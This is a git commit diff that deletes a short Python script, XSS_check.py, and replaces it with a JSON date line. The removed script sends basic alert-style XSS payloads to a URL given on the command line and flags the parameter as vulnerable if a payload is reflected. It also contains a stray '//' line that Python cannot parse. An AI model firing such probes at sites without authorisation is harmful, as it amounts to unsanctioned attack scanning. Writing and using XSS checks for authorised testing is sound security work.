7b72922188224e88a2f38160b8716b1f43a35401
ranjansmygit <ranjan.smy@gmail.com>
2022-11-02 00:43:38 +0530

    2022-11-02T00:43:38+05:30

--- XSS_check.py
+++ XSS_check.py
@@ -1,13 +1,1 @@
-import requests
-import sys
-
-//
-url = sys.argv[1]
-payloads = ['<script>alert(1);</script>', '<BODYONLOAD=alert(1)>']
-for payload in payloads:
-  req = requests.post(url+payload)
-  if payload in req.text:
-    print("Parameter vulnerable\r\n")
-    print("Attack string: "+payload)
-    print(req.text)
-    break
+{"date":"2022-11-02T00:43:38+05:30"}
